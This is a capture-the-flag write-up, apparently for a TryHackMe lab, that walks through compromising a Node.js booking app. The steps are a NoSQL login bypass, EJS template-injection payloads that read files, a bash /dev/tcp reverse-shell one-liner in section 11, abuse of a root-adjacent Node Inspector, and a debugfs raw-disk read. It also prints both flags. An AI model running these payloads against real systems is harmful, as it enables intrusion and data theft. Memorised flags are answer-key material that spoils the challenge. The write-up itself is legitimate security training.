**Tags:** Boot2Root, Web

**Difficulty:** Medium.

## 1. Reconnaissance

We start by scanning the target with Nmap:

```bash
sudo nmap -sS -sV 10.112.149.107
```

Output:

```text
[sudo] password for deb88:
Starting Nmap 7.95 ( https://nmap.org ) at 2026-08-04 11:10 EDT
Nmap scan report for 10.112.149.107
Host is up (0.16s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.18 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Node.js (Express middleware)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Open ports:

* `22/tcp` — SSH;
* `80/tcp` — HTTP, Node.js / Express.

---

## 2. Directory Enumeration

We use Gobuster:

```bash
gobuster dir -u 10.112.149.107 -w ~/HH101/seclists/Discovery/Web-Content/big.txt
```

Result:

```text
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.112.149.107
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /home/deb88/HH101/seclists/Discovery/Web-Content/big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/logout               (Status: 302) [Size: 23] [--> /]
/staff                (Status: 403) [Size: 1547]
```

`/staff` is particularly interesting: without authentication, it returns `403 Forbidden`.

---

## 3. Additional Scanning

We run Nuclei:

```bash
nuclei -u 10.112.149.107 -severity low,medium,high,critical
```

The scan completes without finding any vulnerabilities:

```text
[INF] Scan completed in 1m. 0 matches found.
```

An active ZAP scan was also performed.

The automated scanners did not detect anything of interest.

We check the supported HTTP methods:

```bash
nmap --script http-methods -p80 10.112.149.107
```

We get:

```text
Starting Nmap 7.95 ( https://nmap.org ) at 2026-08-04 12:06 EDT
Nmap scan report for 10.112.149.107
Host is up (0.11s latency).

PORT   STATE SERVICE
80/tcp open  http
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
```

---

# 4. NoSQL Injection in the Login Form

Since the application is written in Node.js, we test the authentication form for a possible **NoSQL injection**.

We try various parameter combinations, for example:

```text
username[$regex]=.*&password[$ne]=1
```

In some cases, the server responds with `302`, while most requests return `401`:

```text
trying nosql injection

username[$regex]=.*&password[$ne]=1 and others
we see that in some cases it returns 302, but in most cases 401
```

Next, we use:

```text
username=attendant&password[$ne]=1
```

As a result, we get successful authentication:

```text
HTTP/1.1 302 Found
X-Powered-By: Express
Location: /staff
Vary: Accept
Content-Type: text/html; charset=utf-8
Content-Length: 35
Set-Cookie: connect.sid=s%3A6VIe29su62233ONbNqsws8zhjOD6xZIu.UzO6WUX5CMo0DjCA5HOCLnxnJNB9sicycOdB%2BI4NC%2Fk; Path=/; HttpOnly
Date: Tue, 04 Aug 2026 16:55:29 GMT
Connection: keep-alive
Keep-Alive: timeout=5

<p>Found. Redirecting to /staff</p>
```

Thus, we managed to log in as the `attendant` user without knowing their actual password.

---

# 5. Accessing `/staff`

We use the obtained session cookie:

```bash
curl -i -b cookies.txt \
http://10.112.149.107/staff
```

We get:

```text
HTTP/1.1 200 OK
X-Powered-By: Express
Content-Type: text/html; charset=utf-8
Content-Length: 2146
ETag: W/"862-sls+S+gGAwkT1qYwK2r9CPPd9u4"
Date: Tue, 04 Aug 2026 16:58:20 GMT
Connection: keep-alive
Keep-Alive: timeout=5
```

The page HTML contains:

```html
<div class="lotus">&mdash; staff console &mdash;</div>
<h1>Cabana Desk</h1>
<p class="sub">Signed in as <strong>attendant</strong>. Customise the guest booking-confirmation message below.</p>
```

The form submits data to:

```text
/staff/preview
```

The field itself is marked as an EJS template:

```html
<textarea name="template">Dear <%= guest %>, your Byte Lotus cabana is confirmed.</textarea>
```

Thus, we gain access to an EJS template preview functionality.

---

# 6. Discovering SSTI

We check whether the supplied EJS code is actually executed.

We use:

```text
<%= 7*7 %>
```

The response contains:

```text
49
```

This confirms a **Server-Side Template Injection (SSTI)** in EJS.

We can now access Node.js objects.

We check the Node.js version:

```text
<%= process.version %>
```

Result:

```text
v22.23.1
```

We check the current working directory:

```text
<%= process.cwd() %>
```

We get:

```text
/opt/poolside
```

---

# 7. Exploring the Node.js Environment

To view environment variables, we use:

```text
<%= JSON.stringify(process.env) %>
```

Result:

```text
{"LANG":"C.UTF-8","PATH":"/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/snap/bin","USER":"poolside","LOGNAME":"poolside","HOME":"/home/poolside","INVOCATION_ID":"eca4e3268c66454f9edec6fe2316d6fd","JOURNAL_STREAM":"10:6288","SYSTEMD_EXEC_PID":"600","MEMORY_PRESSURE_WATCH":"/sys/fs/cgroup/system.slice/poolside.service/memory.pressure","MEMORY_PRESSURE_WRITE":"c29tZSAyMDAwMDAgMjAwMDAwMAA=","NODE_ENV":"production"}
```

In particular, we see:

```text
USER=poolside
HOME=/home/poolside
NODE_ENV=production
```

We also enumerate global objects:

```text
<%= Object.keys(globalThis).join(",") %>
```

Result:

```text
global,clearImmediate,setImmediate,clearInterval,clearTimeout,setInterval,setTimeout,queueMicrotask,structuredClone,atob,btoa,performance,fetch,navigator,crypto
```

And the properties of `process`:

```text
<%= Object.keys(process).join(",") %>
```

Among them is:

```text
getBuiltinModule
```

This method allows us to access Node.js built-in modules.

---

# 8. Reading the Application Source Code

We use the built-in `fs` module:

```text
<%= process.getBuiltinModule("fs").readFileSync("/opt/poolside/app.js","utf8") %>
```

We obtain the application's source code.

It uses:

```javascript
const express = require('express');
const session = require('express-session');
const ejs = require('ejs');
const Datastore = require('@seald-io/nedb');
const crypto = require('crypto');
```

The port is defined through:

```javascript
const PORT = process.env.PORT ? Number(process.env.PORT) : 80;
```

The application also uses sessions:

```javascript
app.use(session({
  secret: 'byte-lotus-poolside',
  resave: false,
  saveUninitialized: false,
}));
```

NeDB is used as the database:

```javascript
const db = new Datastore();
```

---

# 9. Analyzing Authentication

The `seed()` function is particularly interesting:

```javascript
async function seed() {
  await db.removeAsync({}, { multi: true });
  await db.insertAsync([
    { username: 'guest', password: 'sunshine', role: 'guest' },
    { username: 'attendant', password: crypto.randomBytes(18).toString('hex'), role: 'staff' },
  ]);
}
```

It shows two accounts:

```text
guest / sunshine
attendant / random password
```

The `attendant` password is randomly generated, so it cannot be obtained through ordinary brute force.

We check the login function:

```javascript
user = await db.findOneAsync({ username, password });
```

After a successful lookup, a session is created:

```javascript
req.session.user = { username: user.username, role: user.role };
```

The user is then redirected to `/staff`:

```javascript
return res.redirect('/staff');
```

---

# 10. SSTI → Reading Files

After obtaining arbitrary JavaScript execution through EJS, we can use `fs` to read local files.

We use:

```text
<%= process.getBuiltinModule('fs').readFileSync('/home/poolside/user.txt','utf8') %>
```

We obtain `user.txt`:

```text
THM{w4rm_s3ss10n_h1j4ck3d}
```

---

# 11. Obtaining a Reverse Shell

SSTI allows us not only to read files, but also to execute commands through the built-in `child_process` module.

We use:

```text
<%= process.getBuiltinModule('child_process').execSync('bash -c "bash -i >& /dev/tcp/192.168.154.82/4444 0>&1"').toString() %>
```

As a result, we obtain a reverse shell.

We now have a shell as the `poolside` user.

---

# 12. Local Enumeration

After obtaining a shell, we perform standard local enumeration.

The root directory does not contain anything unusual.

We then run LinPEAS.

Current user:

```text
uid=996(poolside) gid=996(poolside) groups=996(poolside)
```

Thus, the reverse shell is running as:

```text
poolside
```

---

# 13. Searching for Kernel Vulnerabilities

LinPEAS detects several potential kernel vulnerabilities:

```text
CVE: CVE-2026-43503 | Name: DirtyClone | Match data: pkg=linux-kernel,ver>=6.19,ver<7.0.10 | Tags: 1 | Rank: Fixed in stable 7.0.10 and mainline 7.1
CVE: CVE-2026-46331 | Name: pedit COW | Match data: pkg=linux-kernel,ver>=6.19,ver<7.0.13 | Tags: 1 | Rank: Fixed in stable 7.0.13 and mainline 7.1
CVE: CVE-2026-46333 | Name: ptrace exit-race | Match data: pkg=linux-kernel,ver>=6.19,ver<7.0.8,cmd:[ "$(cat /proc/sys/kernel/yama/ptrace_scope 2>/dev/null || echo 0)" -lt 2 ] | Tags: 1 | Rank: Upstream issue introduced in 4.10; fixed in 7.0.8; mitigated by kernel.yama.ptrace_scope >= 2
```

LinPEAS reports:

```text
Kernel vulns found: 3
```

It also detects:

```text
CVE-2026-43284 (xfrm-ESP): autoloadable: esp4 esp6 xfrm_user ipcomp6
CVE-2026-43500 (rxrpc): autoloadable: rxrpc
modprobe mitigation (xfrm-ESP): not found
modprobe mitigation (rxrpc): not found
Unprivileged user namespaces: enabled
LIKELY VULNERABLE to CVE-2026-43284 (xfrm-ESP).
LIKELY VULNERABLE to CVE-2026-43500 (rxrpc).
```

However, these options cannot be tested because the system does not have `gcc`, while the discovered exploits are written in C. We also cannot install `gcc`.

---

# 14. Process Analysis

We run:

```bash
ps -ef --forest
```

Among the processes, we find:

```text
root         599       1  0 07:32 ?        00:00:00 /usr/bin/node --inspect=127.0.0.1:9229 processor.js
poolside     600       1  0 07:32 ?        00:00:00 /usr/bin/node app.js
```

The following process is particularly interesting:

```text
/usr/bin/node --inspect=127.0.0.1:9229 processor.js
```

It is running as `root` and listening for the Node.js Inspector on `127.0.0.1:9229`.

---

# 15. Checking the Node.js Inspector

We check port `9229`:

```bash
ss -lntp | grep 9229
```

We get:

```text
LISTEN 0      511        127.0.0.1:9229      0.0.0.0:*
```

The Inspector is only accessible locally.

We query its API:

```bash
curl http://127.0.0.1:9229/json
```

We get:

```json
[ {
  "description": "node.js instance",
  "devtoolsFrontendUrl": "devtools://devtools/bundled/js_app.html?experiments=true&v8only=true&ws=127.0.0.1:9229/97963f1e-7746-414a-aef6-b135fbd023dc",
  "devtoolsFrontendUrlCompat": "devtools://devtools/bundled/inspector.html?experiments=true&v8only=true&ws=127.0.0.1:9229/97963f1e-7746-414a-aef6-b135fbd023dc",
  "faviconUrl": "https://nodejs.org/static/images/favicons/favicon.ico",
  "id": "97963f1e-7746-414a-aef6-b135fbd023dc",
  "title": "processor.js",
  "type": "node",
  "url": "file:///opt/pipelinesvc/telemetry/processor.js",
  "webSocketDebuggerUrl": "ws://127.0.0.1:9229/97963f1e-7746-414a-aef6-b135fbd023dc"
} ]
```

Thus, we obtain the WebSocket endpoint for the Node.js Inspector:

```text
ws://127.0.0.1:9229/97963f1e-7746-414a-aef6-b135fbd023dc
```

---

# 16. Connecting to the Node Inspector

We check the location and version of Node.js:

```bash
which node
```

```text
/usr/bin/node
```

And:

```bash
node -v
```

We get:

```text
v22.23.1
```

We create `/tmp/debug.js`:

```bash
cat > /tmp/debug.js <<'EOF'
const ws = new WebSocket("ws://127.0.0.1:9229/97963f1e-7746-414a-aef6-b135fbd023dc");

ws.onopen = () => {
    console.log("[+] connected");

    ws.send(JSON.stringify({
        id: 1,
        method: "Runtime.evaluate",
        params: {
            expression: "process.getuid()"
        }
    }));
};

ws.onmessage = (event) => {
    console.log(event.data);
};
EOF
```

We run:

```bash
node /tmp/debug.js
```

First, we determine the process UID:

```text
[+] connected
{"id":1,"result":{"result":{"type":"number","value":995,"description":"995"}}}
```

The UID is:

```text
995
```

So the execution is not running as `root`.

---

# 17. Identifying the Inspector Process User

We use the built-in Node Inspector REPL:

```bash
node inspect 127.0.0.1:9229
```

Then:

```text
>> repl
```

We check the UID:

```text
>> process.getuid()
995
```

We get information about the current process:

```text
>> process.getBuiltinModule('child_process').execSync('id').toString()
```

Response:

```text
'uid=995(pipelinesvc) gid=995(pipelinesvc) groups=995(pipelinesvc),6(disk)\n'
```

Thus, the `processor.js` process is running as:

```text
pipelinesvc
```

but belongs to the:

```text
disk
```

group.

This is an important finding because membership in the `disk` group provides direct access to the system's block devices.

---

# 18. Using Disk Access

Having access to the disk device through the `disk` group, we use the Node.js Inspector to execute `debugfs`.

Command:

```text
process.getBuiltinModule('child_process').execFileSync('/usr/sbin/debugfs', ['-R', '  cat  /root/root.txt', '/dev/nvme0n1p1'], { encoding: 'utf8' })
```

Here, `debugfs` is given the command:

```text
cat /root/root.txt
```

and operates directly on the partition:

```text
/dev/nvme0n1p1
```

As a result, we can read the contents of `/root/root.txt` directly from the filesystem:

```text
THM{r4w_d1sk_4cc3ss_w4s_t00_much}
```

---

# Final Chain

```text
Nmap
  │
  ▼
HTTP / Express
  │
  ▼
NoSQL Injection
username=attendant&password[$ne]=1
  │
  ▼
/staff
  │
  ▼
EJS Template
  │
  ▼
SSTI
<%= 7*7 %>
  │
  ▼
Node.js process object
  │
  ├── read app.js
  ├── read user.txt
  └── child_process
          │
          ▼
      Reverse Shell
          │
          ▼
      poolside
          │
          ▼
      LinPEAS
          │
          ▼
      Node.js Inspector :9229
          │
          ▼
      processor.js
          │
          ▼
      pipelinesvc
      groups=...,6(disk)
          │
          ▼
      debugfs
          │
          ▼
      /dev/nvme0n1p1
          │
          ▼
      /root/root.txt
          │
          ▼
THM{r4w_d1sk_4cc3ss_w4s_t00_much}
```

## Flags

**User:**

```text
THM{w4rm_s3ss10n_h1j4ck3d}
```

**Root:**

```text
THM{r4w_d1sk_4cc3ss_w4s_t00_much}
```
